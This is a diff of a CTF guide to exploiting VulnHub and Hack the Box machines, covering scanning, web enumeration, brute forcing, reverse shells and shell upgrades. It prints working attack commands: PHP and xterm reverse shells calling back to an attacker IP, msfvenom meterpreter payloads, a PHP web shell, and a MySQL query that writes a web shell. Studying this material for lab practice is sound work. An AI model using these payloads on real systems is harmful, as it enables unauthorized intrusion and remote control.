@@ -2,11 +2,13 @@
 CTF Series : Vulnerable Machines
 ********************************
 
-This post (Work in Progress) mark downs the learning gathered by doing the vulnerable machines provided by the `VulnHub <https://vulnhub.com>`_ , `Hack the Box <https://hackthebox.eu>`_ and others. Once you download the virtual machine from the website and run it in VMware or Virtual Box, below steps could be followed to find the vulnerabilities.
+This post (Work in Progress) records what we learned by doing vulnerable machines provided by `VulnHub <https://vulnhub.com>`_, `Hack the Box <https://hackthebox.eu>`_ and others. The steps below could be followed to find vulnerabilities, exploit these vulnerablities and finally become system/ root.
 
-We would like to **thank g0tm1lk** for maintaining **Vulnhub** and **moderators** of **HackTheBox**. Also, **shout-out** to each and every **author of the Vulnerable Machine/ write-ups** submitted. Thank you for providing awesome challenges to learn from and sharing your knowledge to the community!. **Thank You!!**
+Once you download a virtual machines from `VulnHub <https://vulnhub.com>`_  you can run it by using virtualization software such as VMware or Virtual Box.
 
-In solving any vulnerable machine, there are few stages:
+We would like to **thank g0tm1lk** for maintaining **Vulnhub** and the **moderators** of **HackTheBox**. Also, **shout-outs** are in order for each and every **authors of Vulnerable Machines and/ or write-ups**. Thank you for providing these awesome challenges to learn from and sharing your knowledge with the IT security community! **Thank You!!**
+
+You generally go through the following stages when solving a vulnerable machine:
 
 * :ref:`finding-the-ip-address`
 * :ref:`port-scanning`
@@ -14,12 +16,14 @@ In solving any vulnerable machine, there are few stages:
 * :ref:`from-nothing-to-unprivileged-shell`
 * :ref:`unprivileged-shell-to-privileged-shell`
 
-In this blog, we have mentioned, what can be done in each stages. Have also provided :ref:`tips-and-tricks` for solving the VMs. :doc:`LFF-IPS-P2-VulnerabilityAnalysis` could also be referred for exploitation of any particular services (As, it provides information such as "If you have found service X (like ssh, Apache tomcat, JBoss, iscsi etc.), how they can be exploited"). There are also appendix related to :ref:`A1-Local-file-Inclusion` and :ref:`A2-File-Upload`
+On this blog, we have mentioned, what can be done in each stages. Furthermore, we have also provided :ref:`tips-and-tricks` for solving vulnerable VMs. Additionally :doc:`LFF-IPS-P2-VulnerabilityAnalysis` could be referred for exploitation of any particular services (i.e. it provides information such as "If you have identified service X (like ssh, Apache tomcat, JBoss, iscsi etc.), how they can be exploited"). Lastly there are also appendixes related to :ref:`A1-Local-file-Inclusion` and :ref:`A2-File-Upload`.
 
 .. _finding-the-ip-address:
 
 Finding the IP address
 ======================
+
+Before, exploiting any machine, we need to figure out it IP address.
 
 Netdiscover
 -----------
@@ -29,13 +33,13 @@ An active/ passive arp reconnaissance tool
 ::
 
   netdiscover [options] 
-  -i interface : The network interface to sniff and inject packets. 
-  -r range : Scan a given range instead of auto scan.
+  -i interface : The network interface to sniff and inject packets on. 
+  -r range : Scan a given range instead performing an auto scan.
 
   Example: 
   netdiscover -i eth0/wlan0/vboxnet0/vmnet1 -r 192.168.1.0/24 
 	
-Interface name for Virtualization Software
+Interface names of common Virtualization Software:
 
 * Virtualbox : vboxnet 
 * Vmware     : vmnet 
@@ -50,7 +54,7 @@ Network exploration tool and security/ port scanner
   nmap [Scan Type] [Options] {target specification} 
   -sP/-sn Ping Scan -disable port scan 
 
-Example
+Example:
 
 ::
 
@@ -61,22 +65,24 @@ Example
 Port Scanning
 =============
 	
-Port scanning provides a large amount of information on open services and possible exploits that target these services. Three options: Unicornscan, nmap, netcat (when nmap is not available).
+Port scanning provides a large amount of information on open services and possible exploits that target these services. 
+
+Common port scanning software include: Unicornscan, nmap, netcat (when nmap is not available).
 
 Unicornscan
 -----------
 
-A port scanner that utilizes its own userland TCP/IP stack, which allows it to run a asynchronous scans. Faster than nmap and can scan 65,535 ports in a relatively shorter time frame. 
+A port scanner that utilizes its own userland TCP/IP stack, which allows it to run asynchronous scans. It can scan 65,535 ports in a relatively shorter time frame (faster than nmap). 
 
 ::  
 
    unicornscan [options] X.X.X.X/YY:S-E 
      -i, --interface : interface name, like eth0 or fxp1, not normally required 
      -m, --mode : scan mode, tcp (syn) scan is default, U for udp T for tcp \`sf' for tcp connect scan and A for arp for -mT you can also specify tcp flags following the T like -mTsFpU for example that would send tcp syn packets with (NO Syn\|FIN\|NO Push\|URG)
-     Address ranges are cidr like 1.2.3.4/8 for all of 1.?.?.?, if you omit the cidr mask then /32 is implied. 
-     Port ranges are like 1-4096 with 53 only scanning one port, a for all 65k and p for 1-1024
+     Address ranges are in cidr notation like 1.2.3.4/8 for all of 1.?.?.?, if you omit the cidr mask /32 is implied. 
+     Port ranges are like 1-4096 with 53 only scanning one port, **a** for all 65k and p for 1-1024
 
-    example: unicornscan 192.168.1.5:1-4000 gateway:a would scan port 1 - 4000 for 192.168.1.5 and all 65K ports for gateway.
+    example: unicornscan 192.168.1.5:1-4000 gateway:a would scan port 1 - 4000 for 192.168.1.5 and all 65K ports for the host named gateway.
 
 Nmap
 -----
@@ -89,7 +95,7 @@ Network exploration tool and security/ port scanner
 
   HOST DISCOVERY:
   -sL: List Scan - simply list targets to scan 
-  -sn: Ping Scan - disable port scan 
+  -sn/-sP: Ping Scan - disable port scan 
   -Pn: Treat all hosts as online -- skip host discovery
 
   SCAN TECHNIQUES: 
@@ -110,18 +116,16 @@ Network exploration tool and security/ port scanner
   MISC: -6: Enable IPv6 scanning -A: Enable OS detection, version detection, script scanning, and traceroute
 
 
-As unicornscan is so fast, it makes sense to use it for scanning large networks or a large number of ports. The idea is to use unicornscan to scan all ports, and make a list of those ports that are open and pass them to nmap for service detection. superkojiman has written a script for this available at `GitHub <https://github.com/superkojiman/onetwopunch>`_.
-
-When portscanning a host, you will be presented with a list of open ports. In many cases, the port number tells you what application is running. Port 25 is usually SMTP, port 80 mostly HTTP. However, this is not always the case, and especially when dealing with proprietary protocols running on non-standard ports you will not be able to determine what application is running.
+As unicornscan is so fast, it makes sense to use it for scanning large networks or a large number of ports. The idea is to use unicornscan to scan all ports, and make a list of those ports that are open and pass them to nmap for service detection. Superkojiman has written a script for this available at `GitHub <https://github.com/superkojiman/onetwopunch>`_.
 
 netcat 
 ------
-Netcat might not be the best tool to use for port scanning, but can be used quickly. netcat scans TCP ports by default, but we can perform UDP scans as well.
+Netcat might not be the best tool to use for port scanning, but it can be used quickly. Netcat scans TCP ports by default, but we can perform UDP scans as well.
 
 TCP Scan
 ^^^^^^^^
 
-For a TCP scan, the format is
+For a TCP scan, the format is:
 
 ::
 
@@ -133,7 +137,7 @@ For a TCP scan, the format is
 UDP Scan
 ^^^^^^^^
 
-For a UDP Port Scan, we need to add -u flag which makes the format
+For a UDP Port Scan, we need to add -u flag which makes the format:
 
 ::
 
@@ -146,7 +150,9 @@ If we have windows machine without nmap, we can use `PSnmap <https://www.powersh
 Amap - Application mapper
 -------------------------
 
-By using **amap**, we can identify if any SSL server is running on port 3445 or some oracle listener on port 23. Also, it will actually do an SSL connect if you want and then try to identify the SSL-enabled protocol! One of the VM in vulnhub was running http and https on the same port.
+When portscanning a host, you will be presented with a list of open ports. In many cases, the port number tells you what application is running. Port 25 is usually SMTP, port 80 mostly HTTP. However, this is not always the case, and especially when dealing with proprietary protocols running on non-standard ports you will not be able to determine which application is running.
+
+By using **amap**, we can identify which services are running on a given port. For example is there a SSL server running on port 3445? or some oracle listener on port 23?. Note that the application can also handle services that requires SSL. Therefore it will perform an SSL connect following by trying to identify the SSL-enabled protocol!  One of the vulnhub VM's for example was running http and https on the same port.
 
 ::
 
@@ -164,16 +170,18 @@ By using **amap**, we can identify if any SSL server is running on port 3445 or 
 Rabbit Holes?
 =============
 
-There would be instances where you are not able to find anything such as any open port or any entry point. The below may provide some clue.
+There will be instances when we will not able to find anything entry point such as any open port. The section below may provide some clues how to get unstuck.
 
 .. _listen-to-the-interface:
 
 Listen to the interface
 ------------------------
 
-We should always listen to the local interface on which the VM is hosted such as vboxnet0 or vmnet using wireshark or tcpdump. Many VMs send data randomly, for example, In one of the VM, it does the arp scan and sends a SYN packet on the port 4444, if something is listening on that port, it send the data.
+Many VMs send data on random ports therefore we recommend to listen to the local interface (vboxnet0 / vmnet) on which the VM is running. This can be done by using wireshark or tcpdump. For example, one of the vulnhub VMs, performs an arp scan and sends a SYN packet on port 4444, if something is listening on that port, it sends some data.
 
 :: 
+
+  tcpdump -i eth0
 
   18:02:04.096292 IP 192.168.56.101.36327 > 192.168.56.1.4444: Flags [S], seq 861815232, win 16384, options [mss 1460,nop,nop,sackOK,nop,wscale 3,nop,nop,TS val 4127458640 ecr 0], length 0
   18:02:04.096330 IP 192.168.56.1.4444 > 192.168.56.101.36327: Flags [R.], seq 0, ack 861815233, win 0, length 0
@@ -181,7 +189,7 @@ We should always listen to the local interface on which the VM is hosted such as
   18:02:04.100773 ARP, Request who-has 192.168.56.3 tell 192.168.56.101, length 28
   18:02:04.096292 IP 192.168.56.101.36327 > 192.168.56.1.4444: Flags [S],
 
-While listening on port 4444, we might receive a something like a base64 encoded string or some message.
+While listening on port 4444, we might receive something like a base64 encoded string or some message.
 
 ::
 
@@ -194,7 +202,7 @@ While listening on port 4444, we might receive a something like a base64 encoded
 DNS Server
 ----------
 
-If the targeted machine is running a DNS Server and we have possible domain name, we may try to figure out A, MX, AAAA records or try zone-transfer to figure out other possible domain names.
+If the targeted machine is running a DNS Server and we have a possible domain name, we may try to figure out A, MX, AAAA records or try zone-transfer to figure out other possible domain names.
 
 ::
 
@@ -206,11 +214,15 @@ If the targeted machine is running a DNS Server and we have possible domain name
  host -t soa <domain>               -- Start of Authority
  host <IP>                          -- Reverse Lookup
  host -l <Domain Name> <DNS Server> -- Domain Zone Transfer
+ 
+ **todo add output example**
 
 SSL Certificate
 ---------------
 
-If the targetted machine is running https server and we are getting a apache default webpage on hitting the https://IPAddress, probably, check the alt-dns-name on the ssl-certificate, create a entry in /etc/hosts and browse with the https://alt-dns-name.
+If the targetted machine is running an https server and we are getting a apache default webpage on hitting the https://IPAddress. vhosts are probably in use. Check the alt-dns-name on the ssl-certificate, create an entry in hosts file ( /etc/hosts ) and check what is being hosted on these domain names by surfing to https://alt-dns-name.
+
+nmap service scan result for port 443 (sample)
 
 ::
 
@@ -223,14 +235,14 @@ If the targetted machine is running https server and we are getting a apache def
 From Nothing to a Unprivileged Shell
 ====================================
 
-At this point, you would have an idea about the different services and service version running on the system. (aka figure out what webservices such as cms or software's are running on the vulnerable machine)
+At this point, we would have an idea about the different services and service version running on the system. Besides the output given by the nmap. It is also recommended to check what software is being used on the webservers (eg certain cms's)
 
 searchsploit
 ------------
 
 Exploit Database Archive Search
 
-First, we need to check if the operating system is using any services which are vulnerable or the exploit is already available in the internet. For example, A vulnerable service webmin is present in one of the VM which can be exploited to extract information from the system.
+First, we check if the operating system and/ or the exposed services are vulnerable to exploits which are already available on the internet. For example, a vulnerable service webmin is present in one of the VM which could be exploited to extract information from the system.
 
 ::
 
@@ -243,7 +255,7 @@ First, we need to check if the operating system is using any services which are 
   |_  ERROR: Failed to get host information from server
   **********Trimmed**************
 
-If we search for webmin in searchsploit, we will find different exploits available for it and we just have to use the correct one based on the utility and the version matching.
+If we search for webmin with searchsploit, we will find different exploits available for it and we just have to use the correct one based on utility and the version matching.
 
 ::
 
@@ -263,7 +275,7 @@ Once we have figured out which exploit to check we can read about it by using th
  searchsploit -x 24674
 
 
-Searchsploit even provide an option to read the nmap XML file and suggest vulnerabilities ( Need nmap -sV -x xmlfile ).
+Searchsploit even provide an option to read the nmap XML file and suggest vulnerabilities ( Requires nmap -sV -x xmlfile ).
 
 ::
   
@@ -272,27 +284,27 @@ Searchsploit even provide an option to read the nmap XML file and suggest vulner
                               Use "-v" (verbose) to try even more combinations
 
 
-.. Tip :: If we don't get a exact exploit for a version, it is also recommended to read the exploits which are highlighted as they may be valid for lower versions too. For example Let's say we are searching for exploits in Example_Software version 2.1.3. However, version 2.2.2 contains multiple vulnerablities. Reading the description for 2.2.2 we find out it's valid for lower versions too.
+.. Tip :: If we don't manage to find an exploit for a specific version, it is recommended to check the notes of the exploits which are highlighted as they may be valid for lower versions too. For example Let's say we are searching for exploits in Example_Software version 2.1.3. However, version 2.2.2 contains multiple vulnerablities. Reading the description for 2.2.2 we find out it's valid for lower versions too.
 
 SecLists.Org Security Mailing List Archive
 ------------------------------------------
 
-There would be some days, when you won't find vulnerability in searchsploit. We should also check the `seclists.org security mailing list google search <http://seclists.org/>`_, if someone has reported any bug for that particular software. 
+There will be some days, when you won't find vulnerability with searchsploit. In this case, we should also check the `seclists.org security mailing list google search <http://seclists.org/>`_, if someone has reported any bug for that particular software that we can exploit. 
 
 Google-Vulns
 ------------
 
-It is suggested that whenever you are googling something,  also try with the words such as ctf, github, python, tool etc. For example. Let's say, you are stuck in a docker or in a specific cms. Search for docker ctf or <cms_name> ctf/ github etc.
+It is suggested that whenever you are googling something,  you add words such as vulnerability, exploit, ctf, github, python, tool etc. to your searchterm. For example. Let's say, you are stuck in a docker or on a specific cms search for docker ctf or <cms_name> ctf/ github etc.
 
 Webservices
 -----------
 
-If a webserver is running on the machine, we can start with running 
+If a webserver is running on a machine, we can start with running 
  
 whatweb
 ^^^^^^^
 
-Utilize whatweb to find what server is running.
+Utilize whatweb to find what software stack a server is running.
 
 ::
 
@@ -302,38 +314,60 @@ Utilize whatweb to find what server is running.
 
 nikto
 ^^^^^
-nikto - Scan web server for known vulnerabilities. It would examine a web server to find potential problems and security vulnerabilities, including:
+nikto - Scans a web server for known vulnerabilities. 
+
+It will examine a web server to find potential problems and security vulnerabilities, including:
 
 * Server and software misconfigurations
 * Default files and programs
 * Insecure files and programs
 * Outdated servers and programs
 
-BurpSuite Spider
-^^^^^^^^^^^^^^^^
-
-There would be some cases where dirb/ dirbuster won't find anything. Happened with us on a Node.js web application. Burpsuite spider helped in finding extra-pages which contained the credentials.
-
 dirb, wfuzz, dirbuster
 ^^^^^^^^^^^^^^^^^^^^^^
 
-Further, we can execute to find any hidden directories.
+Furthermore, we can run the following programs to find any hidden directories.
 
-* `DIRB <https://tools.kali.org/web-applications/dirb>`_ is a Web Content Scanner. It looks for existing (and/or hidden) Web Objects. It basically works by launching a dictionary basesd attack against a web server and analizing the response.
-* `wfuzz <https://tools.kali.org/web-applications/wfuzz>`_ - a web application bruteforcer. Wfuzz might be useful when you are looking for webpage of a certain size. For example: Let's say, when we dirb we get 50 directories. Each directory containing a image. Most of the time, now we need to figure out which image is different. Here, we would figure out what's the size of the normal image and hide that particular response with wfuzz.
+* `DIRB <https://tools.kali.org/web-applications/dirb>`_ is a Web Content Scanner. It looks for existing (and/or hidden) Web Objects. It basically works by launching a dictionary based attack against a web server and analyzing the response.
+* `wfuzz <https://tools.kali.org/web-applications/wfuzz>`_ - a web application bruteforcer. Wfuzz might be useful when you are looking for webpage of a certain size. For example: Let's say, when we dirb we get 50 directories. Each directory containing an image. Most of the time, we then need to figure out which image is different. In this case, we would figure out what's the size of the normal image and hide that particular response with wfuzz.
 * `Dirbuster <https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project>`_ : DirBuster is a multi threaded java application designed to brute force directories and files names on web/ application servers. 
 
-.. Tip :: If the using the dirb/ wfuzz wordlist doesn't result in any directories and the website contains a lot of text, it might be a good idea to use cewl to create a wordlist and utilize that as a dictionary to find hidden directories.
+.. Tip :: Probably, we will be using common.txt (/usr/share/wordlists/dirb/) . If it's doesn't find anything, it's better to double check with /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt which is a list of directories that where found on at least 2 different hosts when DirBuster project crawled the internet. Even if that doesn't work out, try searching with extensions such as .txt, .js, .html, .php. (.txt by default and rest application based)
 
-.. Tip :: Probably, we would be using common.txt in /usr/share/wordlists/dirb/ . If it's doesn't find anything, it's better to double check with /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt which is list of directories that where found on at least 2 different hosts when DirBuster project crawled the internet. Even if that doesn't work out, try searching with extensions .txt, .js, .html, .php. (.txt by default and rest application based)
+.. Tip :: If using the dirb/ wfuzz wordlist doesn't result in any directories and the website contains a lot of text, it might be a good idea to use cewl to create a wordlist and utilize that as a dictionary to find hidden directories.
 
+BurpSuite Spider
+^^^^^^^^^^^^^^^^
+
+There will be some cases when dirb/ dirbuster doesn't find anything. This happened with us on a Node.js web application. Burpsuite's spider helped in finding extra-pages which contained the credentials.
+
+
+Parameter Fuzz?
+^^^^^^^^^^^^^^^
+
+Sometime, we might have a scenario where we have a website which might be protected by WAF.
+
+::
+
+ http://IP/example
+
+Now, this "/example" might be a php or might be accepting a GET Parameter. In that case, we probably need to fuzz it. The hardest thing is that we can find the GET parameters by fuzzing "/example" only if you get some errors from the application, so, the goal is to fuzz using a special char as the parameter's value, something like: "/example?FUZZ=' "
+
+::
+
+ wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H "User-Agent: SomethingNotObivousforWAF" "http://IP/example?FUZZ='"
+
+The other things which may try is putting a valid command such as 'ls, test' so it becomes FUZZ=ls or FUZZ=test
+
+**TODO: gobuster ??**
 
 PUT Method
 ^^^^^^^^^^
 
-Sometimes, it is also a good option to check for the various OPTIONS available on the website such as GET, PUT, DELETE etc.
+Sometimes, it is also a good option to check for the various HTTP verbs that are available such as GET, PUT, DELETE, etc.
+This can be done by making an OPTIONS request.
 
-Curl command can be used to check the options available:
+Curl can be used to check the available options (supported http verbs):
 
 ::
 
@@ -356,9 +390,9 @@ Curl command can be used to check the options available:
   <
   * Connection #0 to host 192.168.126.129 left intact
 
-The put method allows you to upload a file. Eventually, you can upload a php file which can work as a shell. There are multiple methods to upload the file as mentioned in `Detecting and exploiting the HTTP Put Method <http://www.smeegesec.com/2014/10/detecting-and-exploiting-http-put-method.html>`_ 
+The PUT method allows you to upload a file. Which can help us to get a shell on the machine. There are multiple methods available for uploading a file with the PUT method mentioned on `Detecting and exploiting the HTTP Put Method <http://www.smeegesec.com/2014/10/detecting-and-exploiting-http-put-method.html>`_ 
 
-The few are
+A few are:
 
 * Nmap:
 
@@ -381,7 +415,7 @@ The few are
 Wordpress
 ^^^^^^^^^
 
-When running wpscan, also make sure you run \-\-enumerate u for enumerating usernames. By default wpscan doesn't run it. Also, scan for plugins
+When faced with a website that makes use of the wordpress CMS one can run wpscan. Make sure you run \-\-enumerate u for enumerating usernames because by default wpscan doesn't run it. Also, scan for plugins
 
 ::
 
@@ -402,20 +436,32 @@ When running wpscan, also make sure you run \-\-enumerate u for enumerating user
     	Multiple values are allowed : "-e tt,p" will enumerate timthumbs and plugins
     	If no option is supplied, the default is "vt,tt,u,vp"
 
-Wordpress configuration is stored in wp-config.php. If you are able to download it, you might get username and password to database. We can also use wordpress to bruteforce password for a username 
+We can also use wpscan to bruteforce password for a username 
 
 ::
 
   wpscan --url http://192.168.1.2 --wordlist wordlist.txt --username example_username
 
-.. Tip :: If we have found a username and password of wordpress with admin privileges, we can upload a php meterpreter. One of the possible way is to do Appearance > Editor > Possibly edit 404 Template.
+Tips
 
-.. Tip :: If there's exists a SQL-Injection, by which we are able to extract wordpress user and password hash. However, password hash is not crackable. Probably, check the wp-posts table as it might contain some hidden posts.
+* If we have found a username and password of wordpress with admin privileges, we can upload a php meterpreter. One of the possible way is to do Appearance > Editor > Possibly edit 404 Template.
+* The configuration of worpdress is normally speaking stored in wp-config.php. If you are able to download it, you might be luckiy and be able to loot plaintext username and passwords to database or wp-admin page. 
+* If the website is vulnerable for SQL-Injection. We should be able to extract the wordpress users and their password hashes. However, if the password hash is not crackable. Probably, check the wp-posts table as it might contain some hidden posts.
+* Got wordpress credentials, may be utilize `WPTerm <https://wordpress.org/plugins/wpterm/>`_ xterm-like plugin. It can be used to run non-interactive shell commands from the WordPress admin dashboard.
+* If there's a custom plugin created, probably, it would be in the location
 
-Names? Possible Usernames? Possible Passwords?
-^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+ ::
+
+   http://IP/wp-content/plugins/custompluginname
+
+**todo: elborate more on wp scanning and vulnerabilities?**
+
+Names? Possible Usernames & Passwords?
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    
-Sometimes, on visiting the webpage of the webserver (If Vulnerable machine is running any http/ https webserver), you would find possible  names of the employees working in the company. Now, it is common practice to have username based on your first/ last name. Superkojiman has written a script `namemash.py <https://gist.githubusercontent.com/superkojiman/11076951/raw/8b0d545a30fd76cb7808554b1c6e0e26bc524d51/namemash.py>`_ which could be used to create possible usernames. However, we still have a large amount of  usernames to bruteforce with passwords. Further, if the vulnerable machine is running a SMTP mail server, we can verify if the particular username exists or not and modify namemash.py to generate usernames for that pattern.
+Sometimes, when visiting webpages, you will find possible names of the employees working in the company. It is common practice to have a username based on your first/ last name. Superkojiman has written a script `namemash.py <https://gist.githubusercontent.com/superkojiman/11076951/raw/8b0d545a30fd76cb7808554b1c6e0e26bc524d51/namemash.py>`_ which could be used to create possible usernames. However, then we are left with a large amount of potential usernames with no passwords.
+
+If the vulnerable machine is running a SMTP mail server, we can verify if the particular username exists or not and modify namemash.py to generate usernames for that pattern.
 
 * Using metasploit smtp\_enum module: Once msfconsole is running, use auxiliary/scanner/smtp/smtp\_enum, enter the RHOSTS (target address) and USER FILE containing the list of probable user accounts.
 * Using VRFY command:
@@ -428,8 +474,8 @@ Hydra can be used to brute force login web pages
 
 ::
 
-  -l LOGIN or -L FILE login with LOGIN name, or load several logins from FILE
-  -p PASS  or -P FILE try password PASS, or load several passwords from FILE
+  -l LOGIN or -L FILE login with LOGIN name, or load several logins from FILE  (userlist)
+  -p PASS  or -P FILE try password PASS, or load several passwords from FILE  (passwordlist)
   -U        service module usage details
   -e nsr additional checks, "n" for null password, "s" try login as pass, "r" try the reverse login as pass
 
@@ -443,25 +489,25 @@ hydra http-post-form:
 
 Module http-post-form requires the page and the parameters for the web form.
 
-By default this module is configured to follow a maximum of 5 redirections in a row. It always gathers a new cookie from the same URL without variables. The parameters take three ":" separated values, plus optional values.
+The parameters take three ":" separated values, plus optional values.
 
 ::
 
   Syntax:   <url>:<form parameters>:<condition string>[:<optional>[:<optional>]
 
 * First is the page on the server to GET or POST to (URL).
-* Second is the POST/GET variables (taken from either the browser, proxy, etc. with usernames and passwords being replaced in the "^USER^" and "^PASS^" placeholders (FORM PARAMETERS)
+* Second is the POST/GET variables (taken from either the browser, proxy, etc. with usernames and passwords being replaced with the "^USER^" and "^PASS^" placeholders (FORM PARAMETERS)
 * Third is the string that it checks for an *invalid* login (by default) Invalid condition login check can be preceded by "F=", successful condition login check must be preceded by "S=". This is where most people get it wrong. You have to check the webapp what a failed string looks like and put it in this parameter!
 * The following parameters are optional:
   C=/page/uri     to define a different page to gather initial cookies from
-  (h|H)=My-Hdr\: foo   to send a user defined HTTP header with each request	^USER^ and ^PASS^ can also be put into these headers!
+  (h|H)=My-Hdr\: foo   to send a user defined HTTP header with each request ^USER^ and ^PASS^ can also be put into these headers!
 
  * Note: 
 
-  * 'h' will add the user-defined header at the end	regardless it's already being sent by Hydra or not.
+  * 'h' will add the user-defined header at the end regardless it's already being sent by Hydra or not.
   * 'H' will replace the value of that header if it exists, by the one supplied by the user, or add the header at the end
 
- * Note that if you are going to put colons (:) in your headers you should escape them with a backslash (\). All colons that are not option separators should be escaped (see the examples above and below). You can specify a header without escaping the colons, but that way you will not be able to put colons in the header value itself, as they will be interpreted by hydra as option separators.
+ * Note that if you are going to put colons (:) in your headers you should escape them with a backslash (\). All colons that aren't option separators should be escaped (see the examples above and below). You can specify a header without escaping the colons, but that way you will not be able to put colons in the header value itself, as they will be interpreted by hydra as option separators.
 
 Examples:
 
@@ -473,11 +519,12 @@ Examples:
  "/:user=^USER&pass=^PASS^:failed:H=Authorization\: Basic dT1w:H=Cookie\: sessid=aaaa:h=X-User\: ^USER^"
  "/exchweb/bin/auth/owaauth.dll:destination=http%3A%2F%2F<target>%2Fexchange&flags=0&username=<domain>%5C^USER^&password=^PASS^&SubmitCreds=x&trusted=0:reason=:C=/exchweb"
 
+**TODO ncrack?**
 
 Reverse Shells
 --------------
 
-Possibly, we would have figured out some vulnerablity in the services running or misconfiguration and can have a reverse shell using netcat, php, weevely, ruby, perl, python, java, jsp, bash tcp, Xterm, Lynx, Mysql. Mostly taken from `PentestMonkey Reverse shell cheat sheet <http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet>`_  and `Reverse Shell Cheat sheet from HighOn.Coffee <https://highon.coffee/blog/reverse-shell-cheat-sheet/>`_ and some more.
+Possibly, we would have figured out some vulnerability or misconfiguration in the running services which allows us to have a reverse shell using netcat, php, weevely, ruby, perl, python, java, jsp, bash tcp, Xterm, Lynx, Mysql. Mostly taken from `PentestMonkey Reverse shell cheat sheet <http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet>`_  and `Reverse Shell Cheat sheet from HighOn.Coffee <https://highon.coffee/blog/reverse-shell-cheat-sheet/>`_ and more.
 
 netcat (nc)
 ^^^^^^^^^^^
@@ -517,7 +564,7 @@ PHP
 
    <? passthru($_GET["cmd"]); ?>
 
- which can be accessed by
+ which can then be accessed by
 
  :: 
 
@@ -551,19 +598,21 @@ PHP
 
  We can create a php meterpreter shell, run a exploit handler on msf, upload the payload on the server and wait for the connection.
 
+**todo explain how to set up a multi handler**
+
  ::
 
   msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f raw -o /tmp/payload.php
 
 * **PHP Reverse Shell**
 
- PHP Trick: This code assumes that the TCP connection uses file descriptor 3. This worked on my test system. If it doesn’t work, try 4, 5, 6
+ The code below assumes that the TCP connection uses file descriptor 3. This worked on my test system. If it doesn’t work, try 4, 5, 6
 
  :: 
 
   php -r '$sock=fsockopen("192.168.56.101",1337);exec("/bin/sh -i <&3 >&3 2>&3");'
 
- The above can be connected by listening at port 1337 by using nc
+ The above can be connected to by listening on port 1337 by using nc
 
 Weevely
 ^^^^^^^
@@ -580,7 +629,7 @@ which can be called by
 
   weevely http://192.168.1.2/location_of_payload password
 
-However, it wasn't as useful as php meterpreter or reverse shell.
+However, it wasn't as useful as php meterpreter or a reverse shell.
 
 
 Ruby
@@ -706,7 +755,7 @@ Telnet Reverse Shell
 XTerm
 ^^^^^
 
-One of the simplest forms of reverse shell is an xterm session. The following command should be run on the server. It will try to connect back to you (10.0.0.1) on TCP port 6001.
+One of the simplest forms of reverse shell is an xterm session. The following command should be run on the victim server. It will try to connect back to you (10.0.0.1) on TCP port 6001.
 
 .. code-block :: bash 
 
@@ -728,7 +777,8 @@ You’ll need to authorize the target to connect to you (command also run on you
 Lynx
 ^^^^
 
-Obtain an interactive shell through lynx: It is possible to obtain an interactive shell via special LYNXDOWNLOAD URLs. This is a big security hole for sites that use lynx "guest accounts" and other public services. More details `LynxShell <http://insecure.org/sploits/lynx.download.html>`_ 
+Obtain an interactive shell through lynx: It is possible to obtain an interactive shell via special LYNXDOWNLOAD URLs. 
+This is a big security hole for sites that use lynx "guest accounts" and other public services. More details `LynxShell <http://insecure.org/sploits/lynx.download.html>`_ 
 
 When you start up a lynx client session, you can hit "g" (for Goto) and then enter the following URL:
 
@@ -752,7 +802,7 @@ MYSQL
  
   SELECT "<?php passthru($_GET['cmd']); ?>" into dumpfile '/var/www/html/shell.php';
 
-* If you have sql-shell from sqlmap/ phpmyadmin, we can use
+* If you have sql-shell from sqlmap/ phpmyadmin, we can read files by using the load_file function.
 
  :: 
 	
@@ -764,7 +814,7 @@ Reverse Shell from Windows
 If there's a way, we can execute code from windows, we may try
 
 * Powershell Empire/ Metasploit Web-Delivery Method
-* Invoke-Shellcode 
+* Invoke-Shellcode (from powersploit)
 
  ::
 
@@ -772,6 +822,12 @@ If there's a way, we can execute code from windows, we may try
 
 * Upload ncat and execute 
 
+MSF Meterpreter ELF
+^^^^^^^^^^^^^^^^^^^
+
+::
+
+ msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf -o met LHOST=10.10.XX.110 LPORT=4446
 
 Metasploit MSFVenom
 ^^^^^^^^^^^^^^^^^^^
@@ -941,7 +997,6 @@ Probably will get
  standard in must be a tty
 
 The su command would work from a terminal, however, would not take in raw stuff via the shell's Standard Input.
-
 We can use a shell terminal trick that relies on Python to turn our non-terminal shell into a terminal shell
 
 ::
@@ -956,7 +1011,7 @@ Spawning a Fully Interactive TTYs Shell
 
 `Ronnie Flathers <https://twitter.com/ropnop>`_ has already written a great blog on `Upgrading simple shells to fully interactive TTYs <https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/>`_ Hence, almost everything is taken from that blog and kept here for completion purposes.
 
-Many times, we would not get a fully interactive shell which means 
+Many times, we will not get a fully interactive shell therefore it will/ have: 
 
 * Difficult to use the text editors like vim
 * No tab-complete
@@ -982,7 +1037,7 @@ On Victim (launch):
 
 If socat isn't installed, download standalone binaries that can be downloaded from `static binaries <https://github.com/andrew-d/static-binaries>`_ 
 
-Download the correct architecture socat binary to a writable directoy, chmod it, then execute
+Download the correct binary architecture of socat to a writable directory, chmod it, execute
 
 stty
 ^^^^
@@ -990,8 +1045,7 @@ stty
 Use the methods mentioned in :ref:`spawning-a-tty-shell`
 
 Once bash is running in the PTY, background the shell with Ctrl-Z
-
-While the shell is in the background, now examine the current terminal and STTY info so we can force the connected shell to match it
+While the shell is in the background, examine the current terminal and STTY info so we can force the connected shell to match it
 
 ::
  
@@ -1008,10 +1062,9 @@ While the shell is in the background, now examine the current terminal and STTY 
  opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
  isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc
 
-
 The information needed is the TERM type ("xterm-256color") and the size of the current TTY ("rows 38; columns 116")
 
-With the shell still backgrounded, now set the current STTY to type raw and tell it to echo the input characters with the following command:
+With the shell still backgrounded, set the current STTY to type raw and tell it to echo the input characters with the following command:
 
 ::
 
